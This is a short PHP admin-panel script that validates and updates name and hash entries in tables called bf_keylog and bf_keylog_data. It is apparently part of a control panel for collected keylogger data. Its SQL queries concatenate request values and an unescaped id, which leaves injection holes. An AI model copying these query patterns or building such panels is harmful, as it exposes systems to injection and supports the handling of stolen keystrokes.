<?php
$smarty->assign('rand_name', mt_rand(0000000000, 9999999999));
get_function('real_escape_string');

if(!empty($Cur['id'])){	$item = $mysqli->query('SELECT * from bf_keylog WHERE id = '.$Cur['id'].' LIMIT 1');
	if($item->id == $Cur['id']){		$smarty->assign("item", $item);
		if(isset($_POST['submit'])){
			@array_walk($_POST, 'real_escape_string');

			if(empty($_POST['name'])){
				$bad_form['name'] = $lang['knbp'];
				$FORM_BAD = 1;
			}

			if(empty($_POST['hash'])){
				$bad_form['hash'] = $lang['xnmbp'];
				$FORM_BAD = 1;
			}else{
		        if($_POST['name'] == $item->name && $_POST['hash'] == $item->hash){		        	$bad_form['not_update'] = $lang['editno'];
		        	$FORM_BAD = 1;
		        }
		        //echo $_POST['hash'] . '<br>' . $item->hash;
		        if(!isset($bad_form['not_update']) && $_POST['hash'] != $item->hash){		        	$result = $mysqli->query("SELECT hash FROM bf_keylog WHERE (hash='".$_POST['hash']."')");
		        	if($result->hash == $_POST['hash']){
		        		$bad_form['hash'] = $lang['vxyes'];
		        		$FORM_BAD = 1;
		        	}
		        }
			}

			if($FORM_BAD <> 1){
				if($mysqli->query('update bf_keylog set name = \''.$_POST['name'].'\', hash = \''.$_POST['hash'].'\' WHERE (id = \''.$item->id.'\')') == false){
					$errors .= '<div class="t"><div class="t4" align="center">'.$lang['dzsnp'].'</div></div>';
				}else{
					$mysqli->query('update bf_keylog_data set hash = \''.$_POST['hash'].'\' WHERE (hash = \''.$item->hash.'\')');
					$smarty->assign("save", true);
				}
			}else{
				if(count($bad_form) > 0){
					rsort($bad_form);
					for($i = 0; $i < count($bad_form); $i++){
						if ( $i & 1 ) $value_count = "1"; else $value_count = "2";
						$errors .= '<div class="t"><div class="t4" align="center">' . $bad_form[$i] . '</div></div>';
					}
				}
			}
			$smarty->assign("errors", $errors);
		}

		if(empty($_POST['name'])) $_POST['name'] = $item->name;
		if(empty($_POST['hash'])) $_POST['hash'] = $item->hash;
	}
}
?>